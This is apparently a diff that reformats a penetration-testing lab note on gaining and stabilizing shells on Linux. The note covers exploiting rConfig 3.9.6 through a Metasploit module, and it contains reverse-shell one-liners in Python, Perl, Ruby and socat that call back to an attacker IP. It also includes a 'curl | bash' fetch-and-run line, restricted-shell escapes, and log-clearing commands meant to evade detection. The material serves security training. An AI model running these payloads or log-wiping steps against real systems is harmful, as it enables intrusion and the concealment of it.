@@ -1,4 +1,4 @@
-# Infiltrating Unix/Linux
+# 🐧 Linux/Unix Shells
 
 ## Overview
 
@@ -7,18 +7,20 @@ According to W3Techs' ongoing OS usage statistics study, **over 70% of websites 
 ### Strategic Importance
 
 **Why Unix/Linux Shells Matter:**
-- **Web server dominance**: Most web applications run on Linux
-- **Infrastructure backbone**: Critical systems often run on Unix/Linux
-- **Pivot opportunities**: Web servers can provide access to internal networks
-- **On-premises hosting**: Many organizations still host internally
-- **Cloud environments**: Most cloud instances run Linux variants
+
+* **Web server dominance**: Most web applications run on Linux
+* **Infrastructure backbone**: Critical systems often run on Unix/Linux
+* **Pivot opportunities**: Web servers can provide access to internal networks
+* **On-premises hosting**: Many organizations still host internally
+* **Cloud environments**: Most cloud instances run Linux variants
 
 **Attack Surface Considerations:**
-- Web applications and services
-- Network services (SSH, FTP, etc.)
-- Database services (MySQL, PostgreSQL)
-- Configuration management tools
-- Container orchestration platforms
+
+* Web applications and services
+* Network services (SSH, FTP, etc.)
+* Database services (MySQL, PostgreSQL)
+* Configuration management tools
+* Container orchestration platforms
 
 ## Common Considerations
 
@@ -27,37 +29,43 @@ When planning to establish a shell session on a Unix/Linux system, consider thes
 ### 1. System Analysis Questions
 
 **Distribution Identification:**
-- What distribution of Linux is the system running?
-- What version and kernel are in use?
-- What package manager is available?
+
+* What distribution of Linux is the system running?
+* What version and kernel are in use?
+* What package manager is available?
 
 **Shell & Programming Environment:**
-- What shells are available? (bash, sh, zsh, csh)
-- What programming languages exist? (Python, Perl, Ruby, PHP)
-- What interpreters are installed?
-- Are there any restricted shells in place?
+
+* What shells are available? (bash, sh, zsh, csh)
+* What programming languages exist? (Python, Perl, Ruby, PHP)
+* What interpreters are installed?
+* Are there any restricted shells in place?
 
 **Functional Purpose:**
-- What function is the system serving for the network?
-- Is it a web server, database server, or application server?
-- What services are running?
-- What is the system's role in the infrastructure?
+
+* What function is the system serving for the network?
+* Is it a web server, database server, or application server?
+* What services are running?
+* What is the system's role in the infrastructure?
 
 **Application Stack:**
-- What application is the system hosting?
-- What web server software? (Apache, Nginx, Lighttpd)
-- What application frameworks? (PHP, Python, Node.js)
-- What databases are connected?
+
+* What application is the system hosting?
+* What web server software? (Apache, Nginx, Lighttpd)
+* What application frameworks? (PHP, Python, Node.js)
+* What databases are connected?
 
 **Security Posture:**
-- Are there any known vulnerabilities?
-- What security controls are in place?
-- Are there any misconfigurations?
-- What is the patch level?
+
+* Are there any known vulnerabilities?
+* What security controls are in place?
+* Are there any misconfigurations?
+* What is the patch level?
 
 ### 2. Reconnaissance Strategy
 
 **Service Enumeration:**
+
 ```bash
 # Port scanning
 nmap -sC -sV target_ip
@@ -70,6 +78,7 @@ nmap --script vuln target_ip
 ```
 
 **Web Application Assessment:**
+
 ```bash
 # Directory enumeration
 gobuster dir -u http://target_ip -w /usr/share/wordlists/common.txt
@@ -86,11 +95,13 @@ sslyze target_ip:443
 ### Step 1: Host Enumeration
 
 **Comprehensive Nmap Scan:**
+
 ```bash
 nmap -sC -sV 10.129.201.101
 ```
 
 **Sample Output Analysis:**
+
 ```
 PORT     STATE SERVICE  VERSION
 21/tcp   open  ftp      vsftpd 2.0.8 or later
@@ -102,36 +113,41 @@ PORT     STATE SERVICE  VERSION
 ```
 
 **Information Gathered:**
-- **Operating System**: CentOS Linux
-- **Web Stack**: Apache 2.4.6, PHP 7.2.34, OpenSSL 1.0.2k
-- **Services**: FTP, SSH, HTTP/HTTPS, MySQL, RPC
-- **Function**: Web server hosting web application
-- **SSL Configuration**: Self-signed certificate present
+
+* **Operating System**: CentOS Linux
+* **Web Stack**: Apache 2.4.6, PHP 7.2.34, OpenSSL 1.0.2k
+* **Services**: FTP, SSH, HTTP/HTTPS, MySQL, RPC
+* **Function**: Web server hosting web application
+* **SSL Configuration**: Self-signed certificate present
 
 ### Step 2: Web Application Discovery
 
 **Initial Web Reconnaissance:**
-- Navigate to HTTP/HTTPS endpoints
-- Identify hosted applications
-- Check for version information
-- Look for default credentials
+
+* Navigate to HTTP/HTTPS endpoints
+* Identify hosted applications
+* Check for version information
+* Look for default credentials
 
 **Example: rConfig Discovery**
-- **Application**: rConfig Configuration Management Tool
-- **Purpose**: Network device configuration automation
-- **Version**: 3.9.6 (visible on login page)
-- **Critical Risk**: Admin access to network infrastructure
+
+* **Application**: rConfig Configuration Management Tool
+* **Purpose**: Network device configuration automation
+* **Version**: 3.9.6 (visible on login page)
+* **Critical Risk**: Admin access to network infrastructure
 
 **rConfig Significance:**
-- Automates network appliance configuration
-- Remote interface configuration capabilities
-- Potential access to routers, switches, firewalls
-- High-value target for network compromise
-- Could lead to complete network infrastructure control
+
+* Automates network appliance configuration
+* Remote interface configuration capabilities
+* Potential access to routers, switches, firewalls
+* High-value target for network compromise
+* Could lead to complete network infrastructure control
 
 ### Step 3: Vulnerability Research
 
 **Research Methodology:**
+
 1. **Version-specific searches**: "rConfig 3.9.6 vulnerability"
 2. **CVE databases**: Check NIST, MITRE, ExploitDB
 3. **Security advisories**: Vendor bulletins, security researchers
@@ -139,18 +155,21 @@ PORT     STATE SERVICE  VERSION
 5. **Metasploit modules**: Built-in exploit framework
 
 **Search Results for rConfig 3.9.6:**
-- **CVE-2019-16662**: Arbitrary file upload to RCE
-- **CVE-2019-16663**: Authentication bypass
-- **Multiple vulnerabilities**: Configuration disclosure, SQL injection
+
+* **CVE-2019-16662**: Arbitrary file upload to RCE
+* **CVE-2019-16663**: Authentication bypass
+* **Multiple vulnerabilities**: Configuration disclosure, SQL injection
 
 ### Step 4: Metasploit Module Discovery
 
 **Search for Exploits:**
+
 ```bash
 msf6 > search rconfig
 ```
 
 **Available Modules:**
+
 ```
 #  Name                                             Disclosure Date  Rank       Description
 0  exploit/multi/http/solr_velocity_rce             2019-10-29       excellent  Apache Solr RCE via Velocity Template
@@ -160,20 +179,23 @@ msf6 > search rconfig
 ```
 
 **Module Selection Criteria:**
-- **Target specificity**: Matches exact version
-- **Reliability rank**: Good to excellent ranking
-- **Functionality**: Provides shell access
-- **Prerequisites**: Authentication requirements
+
+* **Target specificity**: Matches exact version
+* **Reliability rank**: Good to excellent ranking
+* **Functionality**: Provides shell access
+* **Prerequisites**: Authentication requirements
 
 ### Step 5: Advanced Exploit Research
 
 **GitHub Repository Search:**
+
 ```bash
 # Search pattern
 "rConfig 3.9.6 exploit metasploit github"
 ```
 
 **Manual Module Installation:**
+
 ```bash
 # Locate MSF directories
 locate exploits | grep metasploit
@@ -189,6 +211,7 @@ cp rconfig_vendors_auth_file_upload_rce.rb /usr/share/metasploit-framework/modul
 ```
 
 **Metasploit Updates:**
+
 ```bash
 # Update package manager
 apt update && apt install metasploit-framework
@@ -202,16 +225,19 @@ msfconsole -x "reload_all"
 ### Step 1: Module Selection and Configuration
 
 **Load the Exploit:**
+
 ```bash
 msf6 > use exploit/linux/http/rconfig_vendors_auth_file_upload_rce
 ```
 
 **View Module Options:**
+
 ```bash
 msf6 exploit(linux/http/rconfig_vendors_auth_file_upload_rce) > show options
 ```
 
 **Required Configuration:**
+
 ```bash
 set RHOSTS 10.129.201.101
 set RPORT 443
@@ -223,11 +249,13 @@ set LPORT 4444
 ### Step 2: Exploit Execution
 
 **Launch the Attack:**
+
 ```bash
 msf6 exploit(linux/http/rconfig_vendors_auth_file_upload_rce) > exploit
 ```
 
 **Exploitation Process:**
+
 ```
 [*] Started reverse TCP handler on 10.10.14.111:4444 
 [*] Running automatic check ("set AutoCheck false" to disable)
@@ -242,6 +270,7 @@ msf6 exploit(linux/http/rconfig_vendors_auth_file_upload_rce) > exploit
 ```
 
 **Exploit Steps Breakdown:**
+
 1. **Version Detection**: Confirms vulnerable rConfig 3.9.6
 2. **Authentication**: Successfully logs into rConfig
 3. **Payload Upload**: Uploads PHP-based reverse shell
@@ -253,6 +282,7 @@ msf6 exploit(linux/http/rconfig_vendors_auth_file_upload_rce) > exploit
 ### Step 3: Initial Shell Interaction
 
 **Meterpreter Session:**
+
 ```bash
 meterpreter > dir
 Listing: /home/rconfig/www/images/vendor
@@ -266,6 +296,7 @@ Mode              Size  Type  Last modified              Name
 ```
 
 **Drop to System Shell:**
+
 ```bash
 meterpreter > shell
 Process 3958 created.
@@ -286,39 +317,45 @@ juniper.jpg
 ### Understanding Non-TTY Shells
 
 **Characteristics of Non-TTY Shells:**
-- **Limited functionality**: Missing interactive features
-- **No prompt**: Commands execute without visual feedback
-- **Restricted commands**: `su`, `sudo`, `nano` may not work
-- **No tab completion**: Manual command entry required
-- **No command history**: Previous commands not accessible
-- **Signal handling issues**: Ctrl+C may terminate session
+
+* **Limited functionality**: Missing interactive features
+* **No prompt**: Commands execute without visual feedback
+* **Restricted commands**: `su`, `sudo`, `nano` may not work
+* **No tab completion**: Manual command entry required
+* **No command history**: Previous commands not accessible
+* **Signal handling issues**: Ctrl+C may terminate session
 
 **Why Non-TTY Shells Occur:**
-- **Service account execution**: Payload runs as web server user (apache)
-- **Environment limitations**: No shell environment configured
-- **Security restrictions**: Limited shell access by design
+
+* **Service account execution**: Payload runs as web server user (apache)
+* **Environment limitations**: No shell environment configured
+* **Security restrictions**: Limited shell access by design
 
 ### Spawning TTY Shells
 
 #### Method 1: Python PTY
 
 **Check for Python:**
+
 ```bash
 which python
 which python3
 ```
 
 **Spawn TTY with Python:**
+
 ```bash
 python -c 'import pty; pty.spawn("/bin/sh")'
 ```
 
 **Enhanced Python TTY:**
+
 ```bash
 python3 -c 'import pty; pty.spawn("/bin/bash")'
 ```
 
 **Result:**
+
 ```bash
 sh-4.2$ whoami
 apache
@@ -329,16 +366,19 @@ sh-4.2$ pwd
 #### Method 2: Alternative TTY Methods
 
 **Using Script Command:**
+
 ```bash
 script -qc /bin/bash /dev/null
 ```
 
 **Using Expect:**
+
 ```bash
 expect -c "spawn $SHELL; interact"
 ```
 
 **Using Socat (if available):**
+
 ```bash
 socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.14.111:4445
 ```
@@ -346,21 +386,25 @@ socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.14.111:4445
 #### Method 3: Full Interactive TTY
 
 **Step 1: Initial PTY spawn**
+
 ```bash
 python3 -c 'import pty; pty.spawn("/bin/bash")'
 ```
 
 **Step 2: Background the session**
+
 ```bash
 # Press Ctrl+Z to background
 ```
 
 **Step 3: Configure local terminal**
+
 ```bash
 stty raw -echo && fg
 ```
 
 **Step 4: Reset terminal**
+
 ```bash
 reset
 export SHELL=bash
@@ -372,18 +416,19 @@ stty rows <rows> columns <columns>
 
 ### Common Linux Shells
 
-| Shell | Binary | Description | Features |
-|-------|--------|-------------|----------|
-| **Bash** | `/bin/bash` | Bourne Again Shell | Command completion, history, scripting |
-| **Sh** | `/bin/sh` | Bourne Shell | Basic POSIX compliance, minimal features |
-| **Zsh** | `/bin/zsh` | Z Shell | Advanced features, customization |
-| **Csh** | `/bin/csh` | C Shell | C-like syntax, job control |
-| **Tcsh** | `/bin/tcsh` | TENEX C Shell | Enhanced C shell |
-| **Fish** | `/bin/fish` | Friendly Interactive Shell | User-friendly, auto-suggestions |
+| Shell    | Binary      | Description                | Features                                 |
+| -------- | ----------- | -------------------------- | ---------------------------------------- |
+| **Bash** | `/bin/bash` | Bourne Again Shell         | Command completion, history, scripting   |
+| **Sh**   | `/bin/sh`   | Bourne Shell               | Basic POSIX compliance, minimal features |
+| **Zsh**  | `/bin/zsh`  | Z Shell                    | Advanced features, customization         |
+| **Csh**  | `/bin/csh`  | C Shell                    | C-like syntax, job control               |
+| **Tcsh** | `/bin/tcsh` | TENEX C Shell              | Enhanced C shell                         |
+| **Fish** | `/bin/fish` | Friendly Interactive Shell | User-friendly, auto-suggestions          |
 
 ### Shell Detection and Switching
 
 **Current Shell Detection:**
+
 ```bash
 echo $SHELL
 echo $0
@@ -391,12 +436,14 @@ ps -p $$
 ```
 
 **Available Shells:**
+
 ```bash
 cat /etc/shells
 which bash zsh csh tcsh
 ```
 
 **Switch Shells:**
+
 ```bash
 # Switch to bash
 /bin/bash
@@ -413,6 +460,7 @@ su - username
 #### Python Environment
 
 **Version Detection:**
+
 ```bash
 python --version
 python3 --version
@@ -420,12 +468,14 @@ which python python3
 ```
 
 **Module Availability:**
+
 ```bash
 python -c "import sys; print(sys.path)"
 python3 -c "import pty, subprocess, os; print('Available')"
 ```
 
 **Common Python Exploits:**
+
 ```bash
 # Command execution
 python -c "import os; os.system('whoami')"
@@ -437,12 +487,14 @@ python -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOC
 #### Perl Environment
 
 **Availability Check:**
+
 ```bash
 which perl
 perl --version
 ```
 
 **Perl Exploits:**
+
 ```bash
 # Command execution
 perl -e 'system("whoami")'
@@ -454,12 +506,14 @@ perl -e 'use Socket;$i="10.10.14.111";$p=4444;socket(S,PF_INET,SOCK_STREAM,getpr
 #### Ruby Environment
 
 **Availability Check:**
+
 ```bash
 which ruby
 ruby --version
 ```
 
 **Ruby Exploits:**
+
 ```bash
 # Command execution
 ruby -e 'system("whoami")'
@@ -472,18 +526,19 @@ ruby -rsocket -e'f=TCPSocket.open("10.10.14.111",4444).to_i;exec sprintf("/bin/s
 
 ### Package Managers by Distribution
 
-| Distribution | Package Manager | Commands |
-|--------------|-----------------|----------|
-| **Ubuntu/Debian** | apt | `apt update`, `apt install` |
-| **CentOS/RHEL** | yum/dnf | `yum install`, `dnf install` |
-| **Fedora** | dnf | `dnf install`, `dnf update` |
-| **SUSE** | zypper | `zypper install`, `zypper update` |
-| **Arch Linux** | pacman | `pacman -S`, `pacman -Syu` |
-| **Alpine** | apk | `apk add`, `apk update` |
+| Distribution      | Package Manager | Commands                          |
+| ----------------- | --------------- | --------------------------------- |
+| **Ubuntu/Debian** | apt             | `apt update`, `apt install`       |
+| **CentOS/RHEL**   | yum/dnf         | `yum install`, `dnf install`      |
+| **Fedora**        | dnf             | `dnf install`, `dnf update`       |
+| **SUSE**          | zypper          | `zypper install`, `zypper update` |
+| **Arch Linux**    | pacman          | `pacman -S`, `pacman -Syu`        |
+| **Alpine**        | apk             | `apk add`, `apk update`           |
 
 ### Distribution Detection
 
 **OS Release Information:**
+
 ```bash
 cat /etc/os-release
 cat /etc/*-release
@@ -491,6 +546,7 @@ lsb_release -a
 ```
 
 **Kernel Information:**
+
 ```bash
 uname -a
 cat /proc/version
@@ -498,6 +554,7 @@ hostnamectl
 ```
 
 **System Information:**
+
 ```bash
 cat /etc/issue
 cat /etc/motd
@@ -508,6 +565,7 @@ cat /etc/motd
 ### Container Environment Detection
 
 **Docker Detection:**
+
 ```bash
 cat /proc/1/cgroup | grep docker
 ls -la /.dockerenv
@@ -515,6 +573,7 @@ cat /proc/self/mountinfo | grep docker
 ```
 
 **Container Escape Techniques:**
+
 ```bash
 # Check for privileged containers
 capsh --print
@@ -529,6 +588,7 @@ ls -la /var/run/docker.sock
 ### Privilege Escalation Enumeration
 
 **User Context:**
+
 ```bash
 whoami
 id
@@ -537,18 +597,21 @@ sudo -l
 ```
 
 **SUID/SGID Binaries:**
+
 ```bash
 find / -perm -4000 -type f 2>/dev/null
 find / -perm -2000 -type f 2>/dev/null
 ```
 
 **Writable Directories:**
+
 ```bash
 find / -writable -type d 2>/dev/null
 find /tmp -type f -perm -o+w 2>/dev/null
 ```
 
 **Process Analysis:**
+
 ```bash
 ps aux
 ps -ef
@@ -556,6 +619,7 @@ pstree
 ```
 
 **Network Connections:**
+
 ```bash
 netstat -tulpn
 ss -tulpn
@@ -565,6 +629,7 @@ lsof -i
 ### Persistence Mechanisms
 
 **Cron Jobs:**
+
 ```bash
 crontab -l
 cat /etc/crontab
@@ -572,6 +637,7 @@ ls -la /etc/cron.*
 ```
 
 **Service Files:**
+
 ```bash
 systemctl list-unit-files
 ls -la /etc/systemd/system/
@@ -579,6 +645,7 @@ ls -la /etc/init.d/
 ```
 
 **Startup Scripts:**
+
 ```bash
 ls -la /etc/rc*.d/
 cat /etc/rc.local
@@ -589,36 +656,41 @@ cat /etc/rc.local
 ### Kernel Exploits
 
 **Kernel Version Check:**
+
 ```bash
 uname -r
 cat /proc/version
 ```
 
 **Common Kernel Exploits:**
-- **DirtyCow**: CVE-2016-5195
-- **Overlayfs**: CVE-2021-3493
-- **PwnKit**: CVE-2021-4034
-- **Baron Samedit**: CVE-2021-3156
+
+* **DirtyCow**: CVE-2016-5195
+* **Overlayfs**: CVE-2021-3493
+* **PwnKit**: CVE-2021-4034
+* **Baron Samedit**: CVE-2021-3156
 
 ### Application-Specific Vulnerabilities
 
 **Web Applications:**
-- PHP vulnerabilities and misconfigurations
-- CGI script vulnerabilities
-- File upload vulnerabilities
-- SQL injection leading to file write
+
+* PHP vulnerabilities and misconfigurations
+* CGI script vulnerabilities
+* File upload vulnerabilities
+* SQL injection leading to file write
 
 **Network Services:**
-- SSH misconfigurations
-- FTP anonymous access
-- NFS exports with no_root_squash
-- SMB/CIFS shares
+
+* SSH misconfigurations
+* FTP anonymous access
+* NFS exports with no\_root\_squash
+* SMB/CIFS shares
 
 ## Detection Evasion on Linux
 
 ### Log Management
 
 **Common Log Locations:**
+
 ```bash
 /var/log/auth.log       # Authentication logs
 /var/log/syslog         # System logs
@@ -628,6 +700,7 @@ cat /proc/version
 ```
 
 **Log Cleanup:**
+
 ```bash
 # Clear specific logs
 > /var/log/auth.log
@@ -642,6 +715,7 @@ unset HISTFILE
 ### Process Hiding
 
 **Background Processes:**
+
 ```bash
 nohup command &
 screen -dmS session_name command
@@ -649,6 +723,7 @@ tmux new-session -d -s session_name command
 ```
 
 **Memory-only Execution:**
+
 ```bash
 # Execute from memory
 curl -s http://10.10.14.111/script.sh | bash
@@ -694,35 +769,41 @@ When Python is not available on the target system, several alternative methods c
 #### /bin/sh Interactive Mode
 
 **Basic Interactive Shell:**
+
 ```bash
 /bin/sh -i
 ```
 
 **Expected Output:**
+
 ```bash
 sh: no job control in this shell
 sh-4.2$
 ```
 
 **Features:**
-- **Interactive mode (-i)**: Enables interactive functionality
-- **Basic shell**: Minimal features but reliable
-- **Wide compatibility**: Available on most Unix/Linux systems
-- **Job control limitation**: No background process management
+
+* **Interactive mode (-i)**: Enables interactive functionality
+* **Basic shell**: Minimal features but reliable
+* **Wide compatibility**: Available on most Unix/Linux systems
+* **Job control limitation**: No background process management
 
 #### Alternative Shell Binaries
 
 **Bash Interactive:**
+
 ```bash
 /bin/bash -i
 ```
 
 **Dash Interactive:**
+
 ```bash
 /bin/dash -i
 ```
 
 **Zsh Interactive:**
+
 ```bash
 /bin/zsh -i
 ```
@@ -732,17 +813,20 @@ sh-4.2$
 #### Perl Shell Spawning
 
 **Direct Execution:**
+
 ```perl
 perl -e 'exec "/bin/sh";'
 ```
 
 **Script-based Execution:**
+
 ```perl
 # From within a Perl script
 exec "/bin/sh";
 ```
 
 **Alternative Perl Methods:**
+
 ```perl
 # Using system call
 perl -e 'system("/bin/sh");'
@@ -754,17 +838,20 @@ perl -e '`/bin/sh`;'
 #### Ruby Shell Spawning
 
 **Direct Execution:**
+
 ```ruby
 ruby -e 'exec "/bin/sh"'
 ```
 
 **Script-based Execution:**
+
 ```ruby
 # From within a Ruby script
 exec "/bin/sh"
 ```
 
 **Alternative Ruby Methods:**
+
 ```ruby
 # Using system call
 ruby -e 'system("/bin/sh")'
@@ -776,17 +863,20 @@ ruby -e 'Process.spawn("/bin/sh")'
 #### Lua Shell Spawning
 
 **OS Execute Method:**
+
 ```lua
 lua -e "os.execute('/bin/sh')"
 ```
 
 **Script-based Execution:**
+
 ```lua
 -- From within a Lua script
 os.execute('/bin/sh')
 ```
 
 **Alternative Lua Methods:**
+
 ```lua
 -- Using io.popen
 lua -e "io.popen('/bin/sh'):read('*all')"
@@ -797,57 +887,67 @@ lua -e "io.popen('/bin/sh'):read('*all')"
 #### AWK Shell Spawning
 
 **BEGIN Block Method:**
+
 ```bash
 awk 'BEGIN {system("/bin/sh")}'
 ```
 
 **Pattern-based Method:**
+
 ```bash
 awk '{system("/bin/sh")}' /etc/passwd
 ```
 
 **One-liner with File:**
+
 ```bash
 echo | awk '{system("/bin/sh")}'
 ```
 
 **Features:**
-- **C-like language**: Pattern scanning and processing
-- **Widely available**: Present on most Unix/Linux systems
-- **System function**: Direct system command execution
-- **Report generation**: Original purpose for text processing
+
+* **C-like language**: Pattern scanning and processing
+* **Widely available**: Present on most Unix/Linux systems
+* **System function**: Direct system command execution
+* **Report generation**: Original purpose for text processing
 
 #### Find Command Spawning
 
 **Method 1: Find with AWK**
+
 ```bash
 find / -name nameoffile -exec /bin/awk 'BEGIN {system("/bin/sh")}' \;
 ```
 
 **Method 2: Direct Execution**
+
 ```bash
 find . -exec /bin/sh \; -quit
 ```
 
 **Method 3: Interactive Find**
+
 ```bash
 find /etc -name passwd -exec /bin/sh \;
 ```
 
 **Find Command Breakdown:**
-- **Search function**: Looks for specified file
-- **Execute option (-exec)**: Runs command when file found
-- **Quit option (-quit)**: Stops after first match
-- **Flexible execution**: Can execute any binary
+
+* **Search function**: Looks for specified file
+* **Execute option (-exec)**: Runs command when file found
+* **Quit option (-quit)**: Stops after first match
+* **Flexible execution**: Can execute any binary
 
 #### VIM Editor Spawning
 
 **Method 1: Command Line Option**
+
 ```bash
 vim -c ':!/bin/sh'
 ```
 
 **Method 2: Interactive VIM**
+
 ```bash
 vim
 :set shell=/bin/sh
@@ -855,28 +955,32 @@ vim
 ```
 
 **Method 3: VIM Bang Command**
+
 ```bash
 vim
 :!/bin/sh
 ```
 
 **VIM Features:**
-- **Command mode**: Execute shell commands
-- **Shell setting**: Configure default shell
-- **Bang commands**: Direct command execution
-- **Editor escape**: Break out of text editing context
+
+* **Command mode**: Execute shell commands
+* **Shell setting**: Configure default shell
+* **Bang commands**: Direct command execution
+* **Editor escape**: Break out of text editing context
 
 ### Advanced Alternative Methods
 
 #### Using Less/More Pagers
 
 **Less Command:**
+
 ```bash
 less /etc/passwd
 # Then type: !/bin/sh
 ```
 
 **More Command:**
+
 ```bash
 more /etc/passwd
 # Then type: !/bin/sh
@@ -885,6 +989,7 @@ more /etc/passwd
 #### Using Man Pages
 
 **Man Command:**
+
 ```bash
 man ls
 # Then type: !/bin/sh
@@ -893,6 +998,7 @@ man ls
 #### Using ED Editor
 
 **ED Line Editor:**
+
 ```bash
 ed
 !/bin/sh
@@ -901,6 +1007,7 @@ ed
 #### Using Expect
 
 **Expect Spawn:**
+
 ```bash
 expect -c "spawn /bin/sh; interact"
 ```
@@ -910,6 +1017,7 @@ expect -c "spawn /bin/sh; interact"
 #### Check Available Interpreters
 
 **Programming Languages:**
+
 ```bash
 which python python3 perl ruby lua
 which awk gawk mawk
@@ -918,12 +1026,14 @@ which less more man
 ```
 
 **Shell Interpreters:**
+
 ```bash
 cat /etc/shells
 which bash sh zsh csh tcsh fish
 ```
 
 **System Utilities:**
+
 ```bash
 which find locate ed sed
 which expect script socat
@@ -932,6 +1042,7 @@ which expect script socat
 #### Capability Assessment
 
 **Test Command Execution:**
+
 ```bash
 # Test basic commands
 ls /bin/sh
@@ -948,11 +1059,13 @@ ls -la /usr/bin/vim
 ### File Permission Analysis
 
 **Check Binary Permissions:**
+
 ```bash
 ls -la <path/to/fileorbinary>
 ```
 
 **Example Output:**
+
 ```bash
 -rwxr-xr-x 1 root root 154072 Apr  18  2019 /bin/sh
 -rwxr-xr-x 1 root root    35048 Apr  18  2019 /usr/bin/awk
@@ -960,18 +1073,21 @@ ls -la <path/to/fileorbinary>
 ```
 
 **Permission Breakdown:**
-- **rwx**: Owner (read, write, execute)
-- **r-x**: Group (read, execute)
-- **r-x**: Others (read, execute)
+
+* **rwx**: Owner (read, write, execute)
+* **r-x**: Group (read, execute)
+* **r-x**: Others (read, execute)
 
 ### Sudo Permission Enumeration
 
 **Check Sudo Capabilities:**
+
 ```bash
 sudo -l
 ```
 
 **Sample Output:**
+
 ```bash
 Matching Defaults entries for apache on ILF-WebSrv:
     env_reset, mail_badpass,
@@ -982,18 +1098,21 @@ User apache may run the following commands on ILF-WebSrv:
 ```
 
 **Sudo Analysis:**
-- **NOPASSWD: ALL**: Can run any command without password
-- **env_reset**: Environment variables reset on sudo
-- **secure_path**: Restricted PATH for sudo commands
+
+* **NOPASSWD: ALL**: Can run any command without password
+* **env\_reset**: Environment variables reset on sudo
+* **secure\_path**: Restricted PATH for sudo commands
 
 **Requirements for Sudo Check:**
-- **Stable interactive shell**: TTY required for input
-- **Working terminal**: Proper shell environment
-- **User context**: Current user permissions
+
+* **Stable interactive shell**: TTY required for input
+* **Working terminal**: Proper shell environment
+* **User context**: Current user permissions
 
 ### Privilege Escalation Indicators
 
 **High-Privilege Indicators:**
+
 ```bash
 # Check for wheel group membership
 groups
@@ -1011,6 +1130,7 @@ find / -perm -4000 -type f 2>/dev/null | grep -E "(vim|find|awk|perl|python)"
 ### Stabilization Sequence
 
 **Step 1: Initial Shell Spawn**
+
 ```bash
 # Use any available method from above
 python3 -c 'import pty; pty.spawn("/bin/bash")'
@@ -1021,6 +1141,7 @@ awk 'BEGIN {system("/bin/sh")}'
 ```
 
 **Step 2: Environment Configuration**
+
 ```bash
 export TERM=xterm-256color
 export SHELL=/bin/bash
@@ -1028,6 +1149,7 @@ export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
 ```
 
 **Step 3: History and Aliases**
+
 ```bash
 # Enable command history
 set -o history
@@ -1039,6 +1161,7 @@ alias la='ls -A'
 ### Shell Feature Testing
 
 **Test Interactive Features:**
+
 ```bash
 # Tab completion
 ls /etc/<TAB><TAB>
@@ -1060,6 +1183,7 @@ fg
 ### Common Problems and Solutions
 
 **Problem 1: No Prompt Display**
+
 ```bash
 # Solution: Set PS1 variable
 export PS1='$ '
@@ -1068,6 +1192,7 @@ export PS1='\u@\h:\w\$ '
 ```
 
 **Problem 2: Commands Not Found**
+
 ```bash
 # Solution: Check and set PATH
 echo $PATH
@@ -1075,6 +1200,7 @@ export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
 ```
 
 **Problem 3: Terminal Size Issues**
+
 ```bash
 # Solution: Set terminal dimensions
 stty rows 24 columns 80
@@ -1083,6 +1209,7 @@ stty size
 ```
 
 **Problem 4: No Tab Completion**
+
 ```bash
 # Solution: Enable programmable completion
 set -o tabcompletion
@@ -1093,6 +1220,7 @@ source /etc/bash_completion
 ### Shell Escape Techniques
 
 **From Restricted Shells:**
+
 ```bash
 # Break out of rbash
 export PATH=/bin:/usr/bin:$PATH
@@ -1141,12 +1269,12 @@ python -c "import os; os.system('/bin/bash')"
 
 Linux/Unix systems dominate the server landscape, making shell access skills essential for penetration testers. Success requires:
 
-- **Comprehensive enumeration** to identify attack vectors
-- **Application-specific research** for targeted exploits
-- **Shell improvement techniques** for effective post-exploitation
-- **Multiple spawning methods** when primary techniques fail
-- **Distribution awareness** for platform-specific techniques
-- **Programming language utilization** for payload delivery
-- **Detection evasion** strategies for stealthy operations
+* **Comprehensive enumeration** to identify attack vectors
+* **Application-specific research** for targeted exploits
+* **Shell improvement techniques** for effective post-exploitation
+* **Multiple spawning methods** when primary techniques fail
+* **Distribution awareness** for platform-specific techniques
+* **Programming language utilization** for payload delivery
+* **Detection evasion** strategies for stealthy operations
 
-The key to successful Linux exploitation lies in understanding the target environment, leveraging appropriate tools and techniques, and maintaining situational awareness throughout the engagement. Having multiple shell spawning techniques in your arsenal ensures success even when primary methods are unavailable. Regular practice with different distributions and scenarios will improve proficiency and success rates. 
+The key to successful Linux exploitation lies in understanding the target environment, leveraging appropriate tools and techniques, and maintaining situational awareness throughout the engagement. Having multiple shell spawning techniques in your arsenal ensures success even when primary methods are unavailable. Regular practice with different distributions and scenarios will improve proficiency and success rates.
